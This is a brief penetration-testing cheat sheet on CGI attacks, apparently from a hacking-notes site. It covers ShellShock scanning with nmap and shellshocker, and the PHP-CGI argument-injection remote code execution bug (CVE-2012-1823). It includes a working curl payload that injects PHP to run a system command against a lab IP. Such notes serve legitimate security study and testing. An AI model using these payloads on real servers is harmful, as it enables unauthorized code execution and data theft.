# CGI

## ShellShock

{% embed url="https://nozerobit.gitbook.io/hacknotes/common-exploits/shellshock" %}

{% embed url="https://github.com/erinzm/shellshocker" %}

Nmap:

```
nmap 10.10.10.10 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

Shellshocker example:

```
python shellshocker.py http://10.10.10.10/cgi-bin/admin.cgi
```

## Old PHP + CGI = RCE (CVE-2012-1823, CVE-2012-2311)

{% embed url="https://nozerobit.gitbook.io/hacknotes/common-exploits/php-cgi-exploitation" %}

Basically if cgi is active and php is "old" (<5.3.12 / < 5.4.2) you can execute code.\
In order to exploit this vulnerability, you need to access some PHP files of the web server without sending parameters (especially without sending the character "=").\


Then, in order to test this vulnerability, you could access for example `/index.php?-s` (note the `-s`) and the **source code of the application will appear in the response**.

Then, in order to obtain **RCE** you can send this special query: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` and the **PHP code** to be executed in the **body of the request.**

****\
**Example:**

```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://10.10.10.10/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```

****
